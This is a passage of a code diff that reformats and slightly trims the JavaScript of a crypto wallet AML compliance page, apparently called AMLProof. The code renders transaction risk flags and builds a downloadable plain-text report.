-  document.getElementById('rpt-txlist').innerHTML = d.txns.map(t => {
-    const amtCol = t.dir==='IN'?'var(--safe)':'var(--muted)';
-    const flagHtml = t.flag
-      ? '<span class="rpt-tx-flag" style="color:var(--danger);border-color:rgba(255,61,90,.3)">⚑ FLAGGED</span>'
-      : '<span class="rpt-tx-flag" style="color:var(--muted);border-color:var(--border)">CLEAN</span>';
-    return '<div class="rpt-tx-row"><span class="rpt-tx-hash">'+t.hash+'</span><span class="rpt-tx-dir">'+(t.dir==='IN'?'▼ Received':'▲ Sent')+'</span><span class="rpt-tx-amt" style="color:'+amtCol+'">'+(t.dir==='IN'?'+':'-')+t.amt+'</span>'+flagHtml+'</div>';
+  document.getElementById('rpt-txlist').innerHTML = d.txns.map(t=>{
+    const amtCol=t.dir==='IN'?'var(--safe)':'var(--muted)';
+    const flag=t.flag
+      ?'<span class="rpt-tx-flag" style="color:var(--danger);border-color:rgba(255,61,90,.3)">⚑ FLAGGED</span>'
+      :'<span class="rpt-tx-flag" style="color:var(--muted);border-color:var(--border)">CLEAN</span>';
+    return '<div class="rpt-tx-row"><span class="rpt-tx-hash">'+t.hash+'</span><span class="rpt-tx-dir">'+(t.dir==='IN'?'▼ Received':'▲ Sent')+'</span><span class="rpt-tx-amt" style="color:'+amtCol+'">'+(t.dir==='IN'?'+':'-')+t.amt+'</span>'+flag+'</div>';
   }).join('');
 
-  document.getElementById('rpt-cert-txt').textContent = 'Certified by AMLProof · ' + new Date().toLocaleDateString() + ' · SAFELEMENT LIMITED';
+  document.getElementById('rpt-cert-txt').textContent = 'Certified by AMLProof · '+new Date().toLocaleDateString()+' · SAFELEMENT LIMITED';
 
   const rm = document.getElementById('reportModal');
   rm.classList.add('open');
   rm.scrollTop = 0;
 }
 
-function closeReport() {
-  document.getElementById('reportModal').classList.remove('open');
-}
+function closeReport() { document.getElementById('reportModal').classList.remove('open'); }
 
 function downloadReport() {
   if (!_reportData) return;
@@ -1026,54 +1231,41 @@ function downloadReport() {
     '════════════════════════════════════════════════════════',
     '          AMLProof — AML Compliance Report',
     '════════════════════════════════════════════════════════',
-    '',
-    'Report Date  : ' + new Date().toLocaleString(),
-    'Reference    : AML-' + Date.now().toString(36).toUpperCase().slice(-6),
-    'Issued by    : SAFELEMENT LIMITED · HONG KONG',
-    '',
+    '','Report Date  : '+new Date().toLocaleString(),
+    'Reference    : AML-'+Date.now().toString(36).toUpperCase().slice(-6),
+    'Issued by    : SAFELEMENT LIMITED · HONG KONG','',
     '── WALLET ──────────────────────────────────────────────',
-    'Address      : ' + d.addr,
-    'Chain        : ' + (CHAIN_LABELS_FULL[d.chain]||d.chain),
-    '',
-    '── OVERALL RISK SCORE ──────────────────────────────────',
-    'Risk Score   : ' + d.overallRisk + ' / 100',
-    'Risk Level   : ' + (d.overallRisk>=60?'HIGH RISK':d.overallRisk>=30?'MODERATE RISK':'LOW RISK — CLEAN'),
-    '',
-    '── WALLET SUMMARY ──────────────────────────────────────',
-    'Transactions : ' + d.txns_count.toLocaleString(),
-    'Wallet Age   : ' + d.wallet_age + ' year(s)',
-    'Total Volume : $' + Number(d.volume).toLocaleString(),
-    'Risk Flags   : ' + d.flags,
-    'CEX Interactions : ' + d.cex,
-    'Counterparties   : ' + d.counterparties,
-    '',
+    'Address      : '+d.addr,'Chain        : '+(CHAIN_LABELS_FULL[d.chain]||d.chain),'',
+    '── RISK SCORE ──────────────────────────────────────────',
+    'Score        : '+d.overallRisk+' / 100',
+    'Level        : '+(d.overallRisk>=60?'HIGH RISK':d.overallRisk>=30?'MODERATE RISK':'LOW RISK'),'',
+    '── SUMMARY ─────────────────────────────────────────────',
+    'Transactions : '+d.txns_count,'Wallet Age   : '+d.wallet_age+' year(s)',
+    'Volume       : $'+Number(d.volume).toLocaleString(),'Risk Flags   : '+d.flags,'',
     '── RISK BREAKDOWN ──────────────────────────────────────',
-    ...d.scores.map(s => s.name.padEnd(28) + s.pct + '%'),
-    '',
-    '── SANCTIONS SCREENING ─────────────────────────────────',
-    ...d.sanctionResults.map(r => (r.status==='hit'?'[HIT]  ':r.status==='warn'?'[WARN] ':'[CLEAR]') + ' ' + r.list),
-    '',
-    '── NOTABLE TRANSACTIONS ────────────────────────────────',
-    ...d.txns.map(t => (t.dir+'  '+t.amt).padEnd(28)+(t.flag?'FLAGGED':'CLEAN')+'  '+t.hash),
-    '',
+    ...d.scores.map(s=>s.name.padEnd(26)+s.pct+'%'),'',
+    '── SANCTIONS ───────────────────────────────────────────',
+    ...d.sanctionResults.map(r=>(r.status==='hit'?'[HIT]  ':r.status==='warn'?'[WARN] ':'[CLEAR]')+' '+r.list),'',
+    '── TRANSACTIONS ────────────────────────────────────────',
+    ...d.txns.map(t=>(t.dir+'  '+t.amt).padEnd(26)+(t.flag?'FLAGGED':'CLEAN')+'  '+t.hash),'',
     '════════════════════════════════════════════════════════',
-    'This report is generated automatically by AMLProof.',
-    'It does not constitute legal or financial advice.',
+    'AMLProof · SAFELEMENT LIMITED · For informational use only.',
     '════════════════════════════════════════════════════════',
   ];
   const blob = new Blob([lines.join('\n')], {type:'text/plain'});
-  const a = Object.assign(document.createElement('a'), { href:URL.createObjectURL(blob), download:'AMLProof_Report_'+new Date().toISOString().slice(0,10)+'.txt' });
+  const a = Object.assign(document.createElement('a'), { href:URL.createObjectURL(blob), download:'AMLProof_'+new Date().toISOString().slice(0,10)+'.txt' });
   a.click(); URL.revokeObjectURL(a.href);
 }
 
-// Animate on scroll
-const io = new IntersectionObserver(es => es.forEach(e => {
-  if (e.isIntersecting) { e.target.style.opacity='1'; e.target.style.transform='translateY(0)'; }
-}), { threshold: 0.1 });
-document.querySelectorAll('.step-card,.price-card,.cat-card').forEach(el => {
-  el.style.cssText += 'opacity:0;transform:translateY(20px);transition:opacity .5s ease,transform .5s ease,border-color .3s';
+// Scroll animations
+const io = new IntersectionObserver(es=>es.forEach(e=>{
+  if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)';}
+}),{threshold:0.1});
+document.querySelectorAll('.step-card,.price-card,.cat-card').forEach(el=>{
+  el.style.cssText+='opacity:0;transform:translateY(20px);transition:opacity .5s ease,transform .5s ease,border-color .3s';
   io.observe(el);
 });
 </script>
+
 </body>
 </html>
